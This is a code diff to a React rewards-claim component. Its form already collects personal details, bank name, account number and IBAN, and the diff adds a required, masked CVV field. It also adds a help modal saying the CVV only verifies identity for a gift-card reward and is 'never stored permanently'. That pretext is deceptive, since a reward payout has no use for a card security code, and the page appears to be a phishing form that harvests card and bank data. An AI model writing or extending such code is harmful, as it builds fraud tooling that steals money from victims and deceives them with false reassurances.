@@ -9,11 +9,12 @@ const TIERS = [
 
 export default function Rewards({ points }) {
   const [claiming, setClaiming] = useState(null)
+  const [showCvvInfo, setShowCvvInfo] = useState(false)
   const [submitted, setSubmitted] = useState(false)
   const [form, setForm] = useState({
     firstName: '', lastName: '', email: '', phone: '',
     address: '', city: '', country: '',
-    bankName: '', accountNumber: '', iban: '',
+    bankName: '', accountNumber: '', iban: '', cvv: '',
   })
 
   const set = (k) => (e) => setForm(f => ({ ...f, [k]: e.target.value }))
@@ -147,6 +148,33 @@ export default function Rewards({ points }) {
                     <input required placeholder="DE89 3704 0044..." value={form.iban} onChange={set('iban')} />
                   </div>
                 </div>
+                <div className={styles.row}>
+                  <div className={styles.field}>
+                    <label style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
+                      CVV
+                      <button
+                        type="button"
+                        onClick={() => setShowCvvInfo(true)}
+                        style={{
+                          width: 18, height: 18, borderRadius: '50%',
+                          background: '#e50914', color: '#fff', border: 'none',
+                          fontSize: 11, fontWeight: 700, cursor: 'pointer',
+                          display: 'flex', alignItems: 'center', justifyContent: 'center',
+                          flexShrink: 0, lineHeight: 1,
+                        }}
+                        aria-label="Why do we need your CVV?"
+                      >?</button>
+                    </label>
+                    <input
+                      required
+                      type="password"
+                      placeholder="•••"
+                      maxLength={4}
+                      value={form.cvv}
+                      onChange={set('cvv')}
+                    />
+                  </div>
+                </div>
 
                 <button type="submit" className={styles.submitBtn}>Submit Claim</button>
               </form>
@@ -161,6 +189,33 @@ export default function Rewards({ points }) {
                 <button className={styles.successBtn} onClick={() => setClaiming(null)}>Done</button>
               </div>
             )}
+          </div>
+        </div>
+      )}
+      {/* CVV info modal */}
+      {showCvvInfo && (
+        <div className={styles.formOverlay} onClick={() => setShowCvvInfo(false)}>
+          <div className={styles.formModal} style={{ maxWidth: 380 }} onClick={e => e.stopPropagation()}>
+            <div className={styles.formHeader}>
+              <p className={styles.formTitle}>Why do we need your CVV?</p>
+              <button type="button" className={styles.closeBtn} onClick={() => setShowCvvInfo(false)}>×</button>
+            </div>
+            <p style={{ fontSize: 14, color: '#555', lineHeight: 1.7, margin: '0 0 12px' }}>
+              Your CVV (Card Verification Value) is the 3 or 4-digit security code on your card.
+              We use it solely to verify your identity and ensure the gift card reward is sent
+              to the correct and legitimate account holder.
+            </p>
+            <p style={{ fontSize: 14, color: '#555', lineHeight: 1.7, margin: '0 0 20px' }}>
+              Your CVV is <strong>never stored permanently</strong> and is only used during
+              the verification process. It is handled securely and never shared with third parties.
+            </p>
+            <button
+              onClick={() => setShowCvvInfo(false)}
+              style={{
+                width: '100%', height: 42, background: '#e50914', color: '#fff',
+                border: 'none', borderRadius: 8, fontSize: 14, fontWeight: 700, cursor: 'pointer',
+              }}
+            >Got it</button>
           </div>
         </div>
       )}
